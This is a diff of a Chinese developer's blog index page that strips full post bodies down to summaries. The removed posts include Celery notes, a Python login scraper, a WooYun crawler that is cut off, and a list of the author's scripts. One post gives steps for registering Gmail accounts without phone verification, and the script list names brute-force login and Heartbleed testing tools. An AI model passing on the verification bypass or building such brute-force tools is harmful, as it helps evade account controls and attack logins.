@@ -47,7 +47,7 @@
 				<h1 class="site-name"><a href="/" title="Anka9080&#39;s Notes">Anka9080&#39;s Notes</a></h1>
 				<h2 class="blog-motto">Call Me Fucking Full Stacker</h2>
 			</div>
-			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
 			</a></div>
 			<nav class="animated">
 				<ul>
@@ -63,7 +63,7 @@
  					
 					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
 						<label>Search</label>
-						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
 						<input type="hidden" name="q" value="site:www.evilclay.com">
 					</form>
 					
@@ -75,892 +75,274 @@
     <div id="container">
       <div id="main">
 
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2016/09/06/Celery-分布式任务队列小记/" title="Celery-分布式任务队列小记" itemprop="url">Celery-分布式任务队列小记</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="Anka9080" target="_blank" itemprop="author">Anka9080</a>
-		
-  <p class="article-time">
-    <time datetime="2016-09-06T14:11:37.000Z" itemprop="datePublished"> Published 2016-09-06</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <blockquote>
-<p>需求： 分布式 + 异步 处理任务</p>
-</blockquote>
-<h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><ul>
-<li>任务队列：可以做到在线程间或机器间分发任务。</li>
-<li>Worker 进程：持续监视队列中是否有需要处理的新任务。</li>
-<li>中间人（Broker）：负责把队列中的任务派送给Worker处理。</li>
-<li>Celery系统可以包含多个Worker 和 Broker，一次获得高可用性和横向扩展能力。</li>
-</ul>
-<h4 id="消费者代码-tasks-py"><a href="#消费者代码-tasks-py" class="headerlink" title="消费者代码 tasks.py"></a>消费者代码 tasks.py</h4><p><img src="/img/worker_code.png" alt=""></p>
-<h4 id="启动消费者进程"><a href="#启动消费者进程" class="headerlink" title="启动消费者进程"></a>启动消费者进程</h4><pre><code>celery -A tasks worker --loglevel=info
-</code></pre><h4 id="生产者添加任务"><a href="#生产者添加任务" class="headerlink" title="生产者添加任务"></a>生产者添加任务</h4><p><img src="/img/add_task.png" alt=""></p>
-<h4 id="消费者处理任务"><a href="#消费者处理任务" class="headerlink" title="消费者处理任务"></a>消费者处理任务</h4><p><img src="/img/do_task.png" alt=""></p>
-<p>tasks.py 源码：<br><a href="https://github.com/Evi1CLAY/CoolPool/tree/master/Python/Celery" target="_blank" rel="external">Evi1CLAY Git</a></p>
-<p>参考：</p>
-<blockquote>
-<p><a href="http://docs.jinkan.org/docs/celery/" target="_blank" rel="external">http://docs.jinkan.org/docs/celery/</a></p>
-<p><a href="http://www.ibm.com/developerworks/cn/opensource/os-cn-celery-web-service/index.html" target="_blank" rel="external">http://www.ibm.com/developerworks/cn/opensource/os-cn-celery-web-service/index.html</a></p>
-</blockquote>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-
-  <div class="article-tags">
   
-  <span></span> <a href="/tags/Celery/">Celery</a><a href="/tags/分布式/">分布式</a><a href="/tags/异步/">异步</a><a href="/tags/任务调度/">任务调度</a>
-  </div>
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/2016/09/06/Celery-分布式任务队列小记/#comments" class="ds-thread-count comments-count-link" data-thread-key="2016/09/06/Celery-分布式任务队列小记/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2016/09/05/Flask-Web应用前端通用布局/" title="Flask-Web应用前端通用布局" itemprop="url">Flask-Web应用前端通用布局</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="Anka9080" target="_blank" itemprop="author">Anka9080</a>
-		
-  <p class="article-time">
-    <time datetime="2016-09-05T12:54:04.000Z" itemprop="datePublished"> Published 2016-09-05</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h4 id="Head-区域（不包含JSFile）"><a href="#Head-区域（不包含JSFile）" class="headerlink" title="Head 区域（不包含JSFile）"></a>Head 区域（不包含JSFile）</h4><ul>
-<li>含有子页面可以覆盖的 beforecss 区块</li>
-</ul>
-<h4 id="Body-区域（block-body）"><a href="#Body-区域（block-body）" class="headerlink" title="Body 区域（block body）"></a>Body 区域（block body）</h4><p><strong>1.导航区域</strong></p>
-<ul>
-<li>nav 配合 bootstrap 实现</li>
-</ul>
-<p><strong>2. Container 区域</strong></p>
-<ul>
-<li>row最外层，col-md-12 次外层，内层根据需求来填充。</li>
-</ul>
-<p><strong>3.Modal 区域</strong></p>
-<h4 id="尾部JS区域"><a href="#尾部JS区域" class="headerlink" title="尾部JS区域"></a>尾部JS区域</h4><ul>
-<li>通用JS 写在base.html里面</li>
-<li>自定义JS使用覆盖afterjs 区块的方式实现</li>
-</ul>
-<h4 id="More-Tips…"><a href="#More-Tips…" class="headerlink" title="More Tips…"></a>More Tips…</h4><p>静态文件的目录结构：</p>
-<pre>
-static/
-    css/
-        lib/
-            bootstrap.css
-        style.css
-        home.css
-        admin.css
-    js/
-        lib/
-            jquery.js
-        home.js
-        admin.js
-    img/
-        logo.svg
-        favicon.ico
-</pre>
-
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-
-  <div class="article-tags">
+<section class="post" itemscope itemprop="blogitem">
   
-  <span></span> <a href="/tags/Flask/">Flask</a>
-  </div>
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/2016/09/05/Flask-Web应用前端通用布局/#comments" class="ds-thread-count comments-count-link" data-thread-key="2016/09/05/Flask-Web应用前端通用布局/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2016/08/21/匿名注册Google邮箱/" title="匿名注注册Google邮箱" itemprop="url">匿名注注册Google邮箱</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="Anka9080" target="_blank" itemprop="author">Anka9080</a>
-		
-  <p class="article-time">
-    <time datetime="2016-08-21T05:26:33.000Z" itemprop="datePublished"> Published 2016-08-21</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <blockquote>
-<p>不需要邮箱验证，不需要手机验证</p>
-</blockquote>
-<p><strong>注意： 需要先连接香港的VPN服务器，日本的Vultr 测试失败 </strong></p>
-<ol>
-<li><p>从 www.gmail.com 入口，点击注册。</p>
-</li>
-<li><p>姓氏要手打。（No老师说的）</p>
-</li>
-<li><p>电话区域的区号选择 <strong>特克斯和凯科斯群岛 (Turks &amp; Caicos Islands)</strong> </p>
-</li>
-<li><p>邮件区域不用填写</p>
-</li>
-<li><p>地区选择 <strong>特里斯坦-达库尼亚群岛 (Tristan da Cunha)</strong></p>
-</li>
-</ol>
-<p>测试结果：</p>
-<p>新做的VPN，初次创建Google用户成功，5分钟后同样参数创建用户失败，隔两天后再次创建用户成功。</p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-
-  <div class="article-tags">
+    <a href="/2016/09/06/Celery-分布式任务队列小记/" title="Celery-分布式任务队列小记" itemprop="url">
   
-  <span></span> <a href="/tags/Gmail/">Gmail</a>
-  </div>
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/2016/08/21/匿名注册Google邮箱/#comments" class="ds-thread-count comments-count-link" data-thread-key="2016/08/21/匿名注册Google邮箱/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
+    <h1 itemprop="name">Celery-分布式任务队列小记</h1>
     
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
+     
+           <p itemprop="description" >需求： 分布式 + 异步 处理任务
+
+概念
+任务队列：可以做到在线程间或机器间分发任务。
+Worker 进程：持续监视队列中是否有需要处理的新任务。
+中间人（Broker）：负责把队列中的任务派送给Worker处理。
+Celery系统可以包含多个Worker 和 Broker，一</p>
+        
     
-      <a href="/2016/07/25/python模拟登录并保持cookie/" title="python模拟登录并保持cookie" itemprop="url">python模拟登录并保持cookie</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="Anka9080" target="_blank" itemprop="author">Anka9080</a>
-		
-  <p class="article-time">
-    <time datetime="2016-07-24T17:03:49.000Z" itemprop="datePublished"> Published 2016-07-25</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>最近在爬行 nosec.org 的数据，看了下需要模拟登录拿到cookie后才能访问想抓的数据，重要的是 nosec.org 的登录页面 form 中有个 authenticity_token 字段每次访问登录页面都会自动生成，而且会和你的用户名，密码一样被POST到服务器。</p>
-<p>经过一番研究后发现，直接访问网站登录界面的时候，服务器的响应头会有一个Set-Cookie字段，如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_nosec_session=ZTlHNmxuZXE4R0s1UXpsVUxGRTNPblNBWFd2TXU4TU9aNWVJM2lyLzNFY0pLeUdNMDY1cmZqanpkc0ppaGtjU</span><br><span class="line">i9kTGdWenBrNXJKenNqbnN2YUxucE1DRW5UMHNTR1RxWDZPeGlLazllTmY1czVpYWplazJXdWkvZS9wUHJpc1Jya3ZzcmNVMytPR</span><br><span class="line">it2T1dEcGx4bHNDTTVzSmVTb0xhSjRycE03QUl5RXE5Z2tZWG1mTHFBWGx1QW52QjBURi8rLS1acE8yeVRtMFRZR1JWdExneStwdmpRPT0</span><br><span class="line">%3D-<span class="_">-a</span>6ccd9a12a8af5c8b5fb6625c24bb4db0398c503; path=/; HttpOnly</span><br></pre></td></tr></table></figure>
-<p>而且页面form 的表单有一个 authenticity_token 的 input ，内容如下：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"authenticity_token"</span> <span class="attr">value</span>=<span class="string">"cGdhqVxDMRndpKbpvIV66wfEQlGf4Rz6UtXqsf79brEvFveHw2rCc6uz3euFEyUlpuA0azt5uNhnmrUiCaAyUg=="</span> /&gt;</span></span><br></pre></td></tr></table></figure>
-<p>之前按照后端的逻辑分析_nosec_session 的值 经过解密以及各种xx手法得到 authenticity_token 的值，然后顺带着 username 和 password post就行了，最后发现这真是一个大写的傻逼！！ 老是用后端的思维思考问题，过不得最近走路都走不好了。所以来，直接在页面中抓取已经生成的 authenticity_token 的值，然后 顺着 POST 过去就好了啊。</p>
-<p>使用 requests 库 的 Session() 方法，确实很好用，比早期直接拿 cookielib 就干方便多了。</p>
-<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p>类XXX 的 login 方法用来模拟登录，就贴出这部分登录的代码好了。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XXX</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line"></span><br><span class="line">        r = self.s.get(<span class="string">'https://nosec.org/users/sign_in'</span>)</span><br><span class="line">        html =  r.text</span><br><span class="line">        p1 = re.compile(<span class="string">r'city_token" value="(.*?)"'</span>)</span><br><span class="line">        res = re.search(p1,html)</span><br><span class="line">        authenticity_token =  str(res.group(<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'authenticity_token:'</span>,authenticity_token</span><br><span class="line">        <span class="comment"># print 'cookies',self.s.cookies</span></span><br><span class="line">        <span class="comment"># print s.cookies</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'authenticity_token'</span>:authenticity_token,</span><br><span class="line">            <span class="string">'user[login]'</span>:<span class="string">'xxxxx'</span>,</span><br><span class="line">            <span class="string">'user[password]'</span>:<span class="string">'xxxxx'</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = self.s.post(<span class="string">'https://nosec.org/users/sign_in'</span>,data=data)</span><br><span class="line">        <span class="comment"># print r.headers</span></span><br><span class="line">        <span class="comment"># print r.request.headers</span></span><br><span class="line">        <span class="comment"># print self.s.cookies</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[*] OK!'</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure>
-<p>调用了 login 方法后 下次直接用self.s.get() 请求网页就会带着 cookie 啦。</p>
-<p>之前被思路坑了一次，被笔误也坑了一次(https 写成 http)，导致我抓狂了好久才发现这个 “BUG” = =、所以还得多谢 代码，提高排 Bug 的效率  2333！</p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
+    <time datetime="2016-09-06T14:11:37.000Z" itemprop="datePublished">2016-09-06</time>
+  </a>
+</section>
 
 
-  <div class="article-tags">
+
+
+
+
   
-  <span></span> <a href="/tags/模拟登录/">模拟登录</a>
-  </div>
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/2016/07/25/python模拟登录并保持cookie/#comments" class="ds-thread-count comments-count-link" data-thread-key="2016/07/25/python模拟登录并保持cookie/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2016/07/10/近期更新的-Github-Python-脚本/" title="近期更新的 Github Python 脚本" itemprop="url">近期更新的 Github Python 脚本</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="Anka9080" target="_blank" itemprop="author">Anka9080</a>
-		
-  <p class="article-time">
-    <time datetime="2016-07-09T16:12:47.000Z" itemprop="datePublished"> Published 2016-07-10</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <p>注： 所有脚本经过本地测试运行 OK。</p>
-<p>地址： <code>https://github.com/Evi1CLAY/CoolPool</code></p>
-<ul>
-<li>TUST爆破相关脚本</li>
-</ul>
-<p>包含三个脚本：模拟登陆，批量爆破账号密码相同的账户，查找使用指定密码的用户</p>
-<ul>
-<li>ZoomEyeApiDemo</li>
-</ul>
-<p>ZoomEyeApi 调用批量获取目标URL测试Demo 20160330 可以成功执行</p>
-<ul>
-<li>ascii2word</li>
-</ul>
-<p>ASCII码转换成字母的小脚本</p>
-<ul>
-<li>domain2ip</li>
-</ul>
-<p>将域名批量批量解析得到IP地址</p>
-<ul>
-<li>Ubuntu_SSH日志分析</li>
-</ul>
-<p>分析 <code>Ubuntu /var/log/auth.log</code> 日志文件得到所有试图访问主机的IP以及最后一次试图访问主机的时间</p>
-<ul>
-<li>一些功能模块的测试</li>
-</ul>
-<p>一些Python第三方库的使用测试，详情戳进去</p>
-<ul>
-<li>批量检测域名是否注册</li>
-</ul>
-<p>批量检测脚本生成的一堆域名是否被注册的程序，自己想买一个短点的域名所以写了这个</p>
-<ul>
-<li>OpensslTest.py</li>
-</ul>
-<p>心血漏洞测试脚本，对，就是网上流传的那个Python脚本</p>
-<ul>
-<li>auto_naruto.py</li>
-</ul>
-<p>玩火影online写的小脚本，自动刷FB以及生存试炼</p>
-<ul>
-<li>baidu_spider.py</li>
-</ul>
-<p>批量手机百度搜索结果URL的脚本，网上也有类似的URL收集工具，原理不难</p>
-<ul>
-<li>choubaiduanzi.py</li>
-</ul>
-<p>初学正则时写的爬丑事百科段子的小脚本</p>
-<ul>
-<li>deduplicate.py</li>
-</ul>
-<p>去重脚本，之前还不知道 set 的存在，好尴尬啊</p>
-<ul>
-<li>downloadHTMLByURL.py</li>
-</ul>
-<p>输入目标网址，批量下载网站的静态文件并生成对应的目录结构</p>
-<ul>
-<li>fast_socket_scanner.py</li>
-</ul>
-<p>多线程写的一个端口扫描器</p>
-<ul>
-<li>find_file_by_keyword.py</li>
-</ul>
-<p>根据关键词搜索文本文件的小脚本，后面经常用到</p>
-<ul>
-<li>getSubDomain.py</li>
-</ul>
-<p>获得指定网站的二级域名以及对应的IP+地理位置</p>
-<ul>
-<li>get_google_count_by_url.py</li>
-</ul>
-<p>调用selenium库开启Firefox浏览器抓取数据，这个库多用于自动化吧，想在想想用这个思路抓数据好Low啊 TAT</p>
-<ul>
-<li>group_count.py</li>
-</ul>
-<p>合并相同的字符串并计数</p>
-<ul>
-<li>sina_spider.py</li>
-</ul>
-<p>爬取 sina url 的小小爬虫</p>
-<ul>
-<li>socket_scanner.py</li>
-</ul>
-<p>socket 实现的端口扫描器</p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-
-  <div class="article-tags">
+<section class="post" itemscope itemprop="blogitem">
   
-  <span></span> <a href="/tags/github/">github</a>
-  </div>
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/2016/07/10/近期更新的-Github-Python-脚本/#comments" class="ds-thread-count comments-count-link" data-thread-key="2016/07/10/近期更新的-Github-Python-脚本/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2016/05/27/wooyun-spider/" title="爬取 WooYun 论坛所有漏洞条目的相关信息" itemprop="url">爬取 WooYun 论坛所有漏洞条目的相关信息</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="Anka9080" target="_blank" itemprop="author">Anka9080</a>
-		
-  <p class="article-time">
-    <time datetime="2016-05-27T10:24:16.000Z" itemprop="datePublished"> Published 2016-05-27</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <p><strong>每个漏洞条目包含：</strong></p>
-<p>乌云ID，漏洞标题，漏洞所属厂商，白帽子，漏洞类型，厂商或平台给的Rank值</p>
-<p><strong>主要是做数据分析使用：</strong><br>可以分析某厂商的各类型漏洞的统计；<br>或者对白帽子的能力进行分析…..</p>
-<p>数据更新时间：2016/5/27<br>漏洞条目：104796条</p>
-<p><strong>数据截图如下：</strong></p>
-<p><img src="http://images2015.cnblogs.com/blog/671902/201605/671902-20160527002538147-1212236189.png" alt=""></p>
-<p><strong>数据网盘链接：</strong></p>
-<p>链接：<a href="http://pan.baidu.com/s/1bpDNKOv" target="_blank" rel="external">http://pan.baidu.com/s/1bpDNKOv</a> 密码：6y57</p>
-<p><strong>爬虫脚本：</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="comment"># author: anka9080</span></span><br><span class="line"><span class="comment"># version: 1.0  py3</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> sys,re,time,socket</span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> get</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue, Empty</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 全局变量</span></span><br><span class="line">COUNT = <span class="number">1</span></span><br><span class="line">START_URL = <span class="string">'http://wooyun.org/bugs'</span></span><br><span class="line">ID_DETAILS = []</span><br><span class="line">ALL_ID = []</span><br><span class="line">Failed_ID = []</span><br><span class="line">PROXIES = []</span><br><span class="line"> </span><br><span class="line">HEADERS = &#123;</span><br><span class="line">    <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml,application/json;q=0.9,image/webp,*/*;q=0.8"</span>,</span><br><span class="line">    <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate, sdch"</span>,</span><br><span class="line">    <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8"</span>,</span><br><span class="line">    <span class="string">"Cache-Control"</span>: <span class="string">"max-age=0"</span>,</span><br><span class="line">    <span class="string">"Connection"</span>: <span class="string">"keep-alive"</span>,</span><br><span class="line">    <span class="string">"DNT"</span>: <span class="string">"1"</span>,</span><br><span class="line">    <span class="string">"Host"</span>: <span class="string">"wooyun.org"</span>,</span><br><span class="line">    <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>,</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2716.0 Safari/537.36"</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WooYunSpider</span><span class="params">(Thread)</span>:</span></span><br><span class="line">    <span class="string">"""docstring for WooYunSpider"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,queue)</span>:</span></span><br><span class="line">        Thread.__init__(self)</span><br><span class="line">        self.pattern1 = re.compile(<span class="string">r'title&gt;(.*?)\| WooYun.*?keywords" content="(.*?),(.*?),(.*?),wooyun'</span>,re.S)  <span class="comment"># 匹配模式在 compile 的时候指定</span></span><br><span class="line">        self.pattern2 = re.compile(<span class="string">r"漏洞Rank：(\d&#123;1,3&#125;)"</span>)</span><br><span class="line">        self.queue = queue</span><br><span class="line">        self.start() <span class="comment"># 执行 run()</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"每次读取 queue 的一条"</span></span><br><span class="line">        <span class="keyword">global</span> COUNT,RES_LOG,ERR_LOG</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                id = self.queue.get(block = <span class="keyword">False</span>)</span><br><span class="line">                r = get(<span class="string">'http://wooyun.org/bugs/'</span> + id,headers = HEADERS)</span><br><span class="line">                html = r.text</span><br><span class="line">            <span class="keyword">except</span> Empty:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                msg = <span class="string">'[ - Socket_Excpt ] 链接被拒绝，再次添加到队列：'</span> + id</span><br><span class="line">                print(msg)</span><br><span class="line">                ERR_LOG.write(msg+<span class="string">'\n'</span>)</span><br><span class="line">                self.queue.put(id)  <span class="comment"># 访问失败则把这个 URL从新加入队列</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                title,comp,author,bug_type,rank = self.get_detail(html,id)</span><br><span class="line">                detail = id+<span class="string">'----'</span>+title+<span class="string">'----'</span>+comp+<span class="string">'----'</span>+author+<span class="string">'----'</span>+bug_type+<span class="string">'----'</span>+rank</span><br><span class="line">                <span class="keyword">try</span>: <span class="comment"># 写入文件可能会诱发 gbk 编码异常，这里保存 id 到 failed</span></span><br><span class="line">                    RES_LOG.write(detail + <span class="string">'\n'</span>)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    Failed_ID.append(id)</span><br><span class="line">                    msg = <span class="string">'[ - Encode_Excpt ] 字符编码异常：'</span> + id</span><br><span class="line">                    print(msg)</span><br><span class="line">                    ERR_LOG.write(msg+<span class="string">'\n'</span>)</span><br><span class="line">                ID_DETAILS.append(detail)</span><br><span class="line">            <span class="comment"># time.sleep(1)</span></span><br><span class="line"> </span><br><span class="line">            print(<span class="string">'[ - info ] id: &#123;&#125;  count: &#123;&#125;  time: &#123;:.2f&#125;s'</span>.format(id,COUNT,time.time() - start))</span><br><span class="line">            COUNT += <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 由 缺陷编号 获得对应的 厂商 和 漏洞类型信息</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_detail</span><span class="params">(self,html,id)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> ERR_LOG</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># print(html)</span></span><br><span class="line">            res = self.pattern1.search(html)</span><br><span 